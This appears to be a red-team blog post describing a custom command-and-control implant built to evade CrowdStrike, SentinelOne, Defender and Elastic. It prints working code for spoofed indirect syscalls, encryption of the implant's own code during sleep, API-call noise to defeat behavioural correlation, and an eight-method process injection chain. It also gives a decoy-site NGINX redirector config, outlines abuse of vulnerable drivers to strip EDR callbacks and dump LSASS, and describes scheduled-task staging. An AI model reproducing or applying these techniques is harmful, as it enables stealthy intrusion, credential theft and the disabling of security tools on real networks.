Building a Custom C2 Framework from Scratch

JANUARY 2026 — RED TEAM / MALWARE DEVELOPMENT / EDR EVASION

After spending months working with open-source C2 frameworks — Havoc, Sliver, Mythic — I kept running into the same problem: every framework I used had signatures that major EDR vendors already knew. Even with custom loaders and obfuscation, the underlying beacon behavior was detectable because the architecture itself was fingerprinted.

So I built my own. Written entirely in C with hand-crafted assembly for syscall dispatch, zero runtime dependencies, and a modular evasion architecture that layers 19 independent techniques into a single implant. This post covers the design philosophy, key innovations, and the technical decisions that make a custom C2 operationally viable against modern EDR.

Architecture

The framework follows a three-tier model: implant (C, runs on target), server (Python, handles tasking), and operator console (connects to server for command dispatch). The implant is the core engineering challenge — everything else is plumbing.

Syscall Evasion: Tartarus Gate + Stack Spoofing

Modern EDR hooks ntdll.dll at the usermode boundary. Every major framework resolves this with some form of direct or indirect syscalls. The problem is that EDR vendors now fingerprint how you make syscalls — CrowdStrike, for example, walks the call stack and flags any syscall instruction whose return address doesn't point into ntdll.

The implant implements three escalating modes:

syscalls.asm 
; Mode 2: Spoofed syscalls — forge stack frame with kernel32 return address
; Defeats CrowdStrike stack-walking heuristics

spoof_syscall PROC
    mov     r10, rcx               ; standard syscall ABI
    mov     eax, [rsp + 28h]       ; SSN from resolver
    push    rbp
    mov     rbp, rsp
    sub     rsp, 30h
    mov     [rsp + 20h], rbp       ; save real frame
    lea     rbp, [k32_ret_gadget]   ; forge return → kernel32!ret
    mov     [rsp], rbp              ; stack walker sees kernel32
    jmp     qword ptr [ntdll_syscall_ret] ; indirect jmp to ntdll
spoof_syscall ENDP

Tartarus Gate resolves syscall numbers (SSNs) by sorting Zw* export addresses from the ntdll export table rather than parsing stub bytes. This is immune to all forms of usermode hooking because it never reads the hooked code — only the export address table, which EDR hooks don't modify.

Sleep Obfuscation

Memory scanners like SentinelOne periodically scan process memory for known shellcode patterns. If your implant is sitting in memory with executable code visible, it will eventually get flagged.

The implant XOR-encrypts its own .text section during sleep intervals. A minimal sleeper routine lives in a separate PE section (.sleep) that stays executable and handles the encrypt/decrypt cycle:

sleep_obfusc.c 
void sleep_cycle(DWORD ms) {
    DWORD old;
    // Make .text writable
    VirtualProtect(text_base, text_size, PAGE_READWRITE, &old);
    // XOR-encrypt .text with session key
    for (size_t i = 0; i < text_size; i++)
        text_base[i] ^= xor_key[i % key_len];
    // Restore original protection
    VirtualProtect(text_base, text_size, old, &old);

    Sleep(ms);  // scanner sees encrypted garbage

    // Decrypt before resuming execution
    VirtualProtect(text_base, text_size, PAGE_READWRITE, &old);
    for (size_t i = 0; i < text_size; i++)
        text_base[i] ^= xor_key[i % key_len];
    VirtualProtect(text_base, text_size, old, &old);
}

During sleep, the implant's code is indistinguishable from random data. The sleeper thread itself is tiny (<200 bytes), lives outside the encrypted region, and contains no suspicious API imports.

Anti-Correlation Framework

This is the technique I'm most proud of. EDR products don't detect individual API calls — they detect sequences. VirtualAllocEx followed by WriteProcessMemory followed by CreateRemoteThread within a short time window is the classic injection signature.

The anti-correlation framework breaks this pattern at three levels:

  • Operation shuffling — the order of evasion operations is randomized on each execution. ETW patching might happen before or after AMSI patching, ntdll unhooking might precede or follow sandbox checks.
  • Temporal jitter — randomized delays (500–3000ms) between operations push correlated events outside EDR's sliding time windows.
  • Noise injection — benign API calls (GetSystemInfo, GetTickCount, heap allocations) are interleaved between suspicious calls to dilute the signal-to-noise ratio in telemetry.
anti_corr.c 
void noise_burst(void) {
    SYSTEM_INFO si;
    GetSystemInfo(&si);              // benign call #1
    GetTickCount64();                // benign call #2
    void* p = HeapAlloc(GetProcessHeap(), 0, 64);
    HeapFree(GetProcessHeap(), 0, p);  // alloc/free cycle
    GetCurrentProcessId();           // benign call #3
}

void execute_with_anticorr(evasion_op_t* ops, int count) {
    shuffle(ops, count);            // randomize execution order
    for (int i = 0; i < count; i++) {
        noise_burst();
        ops[i].execute();
        Sleep(rand_range(500, 3000));  // break temporal correlation
        noise_burst();
    }
}

The result is that each execution of the implant produces a unique telemetry signature. EDR rules that match on specific API call sequences will never see the same pattern twice.

Cascading Injection

Rather than hardcoding a single injection technique, the implant implements eight methods with automatic fallback. If the primary method is blocked by EDR, it cascades to the next:

inject.c 
static inject_fn injection_chain[] = {
    inject_threadpool,       // thread pool callback abuse
    inject_byovd_write,      // kernel R/W via vulnerable driver
    inject_section_apc,      // NtCreateSection + NtQueueApcThread
    inject_section_map,      // section mapping with dual views
    inject_module_stomp,     // overwrite amsi.dll .text
    inject_hollow,           // process hollowing
    inject_phantom,          // phantom DLL hollowing
    inject_classic,          // VirtualAllocEx + WriteProcessMemory
};

BOOL inject(HANDLE hProcess, LPVOID sc, SIZE_T sc_len) {
    for (int i = 0; i < ARRAYSIZE(injection_chain); i++) {
        if (injection_chain[i](hProcess, sc, sc_len))
            return TRUE;
        noise_burst();
        Sleep(rand_range(200, 800));
    }
    return FALSE;
}

This is operationally significant because different EDR products block different techniques. CrowdStrike might catch section mapping but miss thread pool abuse. Defender might flag hollowing but ignore module stomping. The cascading approach adapts to whatever defenses are present without operator intervention.

C2 Communication: HTTPS Redirector Infrastructure

The framework runs on dedicated AWS infrastructure with a layered redirector architecture designed to separate the C2 server from direct exposure. The C2 teamserver sits inside a private VPC with no public-facing ports — all inbound traffic flows through an NGINX reverse proxy on a separate instance.

The key to the redirector is header-based filtering. The implant sends beacons as standard HTTPS requests to a domain that resolves to the NGINX instance, but includes a custom header with an operation-specific token compiled into the binary at build time. NGINX inspects incoming requests and applies a simple routing decision:

  • Valid header — request is proxied to the C2 teamserver over the internal VPC network. The implant receives tasking or exfiltrates results.
  • Missing or invalid header — NGINX serves a legitimate-looking website (a cloned corporate page or blog). Threat hunters, sandboxes, and incident responders see a normal site.
nginx.conf — redirector 
server {
    listen 443 ssl;
    server_name  legitimate-domain.com;

    # Default: serve decoy site
    location / {
        root  /var/www/decoy;
        index index.html;
    }

    # Implant traffic: header must match compiled token
    location /api/v1/ {
        if ($http_x_request_id != "[op-token]") {
            return 200 "OK";
        }
        proxy_pass  http://10.0.1.50:8443;
        proxy_set_header  Host $host;
        proxy_set_header  X-Forwarded-For $remote_addr;
    }
}

This architecture gives us several operational advantages: the C2 server has zero internet exposure, the domain passes reputation checks and TLS certificate inspection, and automated scanners never reach the teamserver. AES-256-CBC with a per-operation pre-shared key encrypts all payloads before transport, so even if traffic is intercepted at the NGINX layer, the content is opaque.

BYOVD: Kernel-Level Evasion

When the target environment demands it, the implant can load a vulnerable signed driver to gain kernel read/write primitives. Three drivers are supported with automatic fallback — RTCore64.sys (MSI Afterburner), dbutil_2_3.sys (Dell), and gdrv.sys (Gigabyte).

With kernel R/W, the implant can:

  • Inject shellcode directly via kernel memory writes, bypassing all usermode hooks on NtWriteVirtualMemory
  • Disable ETW-TI at the kernel level (more thorough than patching EtwEventWrite)
  • Remove EDR callbacks — zero out PsSetCreateProcessNotifyRoutine, PsSetCreateThreadNotifyRoutine, and PsSetLoadImageNotifyRoutine entries
  • Dump LSASS by clearing the _PS_PROTECTION byte, bypassing Protected Process Light without triggering PPL violation alerts

Staged Temporal Separation

The most unconventional evasion technique in the framework. Instead of executing the full kill chain in one process lifetime, the implant splits execution across two separate process invocations separated by 5–15 minutes:

  1. Stage 0: Write a registry marker, create a scheduled task with a randomized delay, then exit cleanly. No suspicious behavior — just registry and task scheduler activity.
  2. Stage 1: The scheduled task re-invokes the binary minutes later. It detects the registry marker, cleans it up, and proceeds with the full evasion and injection chain.

This defeats behavioral EDR analysis because the correlation engine's sliding window has expired by the time Stage 1 executes. The two stages appear as unrelated process events.

Results

The framework has been tested against CrowdStrike Falcon, SentinelOne, Microsoft Defender for Endpoint, and Elastic EDR in controlled lab environments. With the full evasion chain enabled, the implant achieves reliable initial access and persistence without triggering high-confidence alerts.

The key insight from building this is that EDR evasion is not about finding one magic trick — it's about layering independent techniques so that no single detection rule covers enough of the chain to generate an alert. Each technique might be individually known, but the combination and the anti-correlation framework make the composite signature unique to each execution.
